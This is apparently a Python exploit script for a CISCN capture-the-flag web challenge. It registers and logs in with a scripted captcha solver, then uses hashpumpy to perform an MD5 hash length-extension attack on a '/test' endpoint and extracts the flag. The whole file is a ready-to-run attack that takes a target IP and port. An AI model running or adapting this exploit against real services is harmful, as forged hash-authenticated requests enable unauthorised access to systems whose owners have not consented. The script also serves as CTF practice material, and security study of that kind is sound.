import re
import sys
import requests as req
from pyquery import PyQuery as PQ
import string
import random
import re
import hashpumpy

class WebChecker:
    def __init__(self, ip, port, csrfname='_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = '20009uuu'
        self.password = '123456'
        self.change_pass = '654321'
        self.mail = 'i@qvq.im'
        self.csrfname = csrfname
        self.integral = None
        self.session = req.session()

    def _generate_randstr(self, len=10):
        return ''.join(random.sample(string.ascii_letters, len))

    def _get_uuid(self):
        res = self.session.get(self.url + 'login')
        dom = PQ(res.text)
        return dom('form canvas').attr('rel')

    def _get_answer(self):
        uuid = self._get_uuid()
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])),
                           int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])),
                           int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x, y


    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def login_test(self):
        rs = self.session.get(self.url + 'login')
        token = self._get_token(rs.text)
        x, y = self._get_answer()
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        return True

    def register_test(self, invite=''):
        rs = self.session.get(self.url + 'register')
        token = self._get_token(rs.text)
        x, y = self._get_answer()
        rs = self.session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "password_confirm": self.password,
            "mail": self.mail,
            "invite_user": invite,
            "captcha_x": x,
            "captcha_y": y,
        })
        return True


    def ciscn(self):
        rs = self.session.get(self.url + 'test')

        dom = PQ(rs.text)

        form = dom("form")

        token = str(PQ(form[0])("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()


        rs = self.session.post(self.url + 'test', data={
            self.csrfname: token,

            'parameter':'hhhhhhhhhhhh'

        })



        md5_get = rs.headers['md5']
        length = rs.headers['length']


        result = hashpumpy.hashpump(md5_get, "hhh", "asd", int(length))

        parameter = result[1].encode('string-escape').decode('unicode-escape')


        md5 = result[0].encode('string-escape').decode('unicode-escape')




        rs = self.session.post(self.url + 'test', data={
            self.csrfname: token,
            'md5':md5,
            'parameter': parameter

        })

        flag=rs.text

        if re.search(r'ciscn{.*}',flag):

            print re.search(r'ciscn{.*}',flag).group()
            return re.search(r'ciscn{.*}',flag).group()
        else:
            return False





def exp(ip, port):

        check = WebChecker(str(ip), str(port), '_xsrf')
        check.register_test()
        check.login_test()
        if check.ciscn():
            return True
        else:
            return False


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Wrong Params")
        print("example: python %s %s %s %s" % (sys.argv[0], '127.0.0.1', '80', '_xsrf'))
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    csrfname = sys.argv[3]
    if exp(ip, port):
        print "Success!"
    else:
        print "Defeate!"
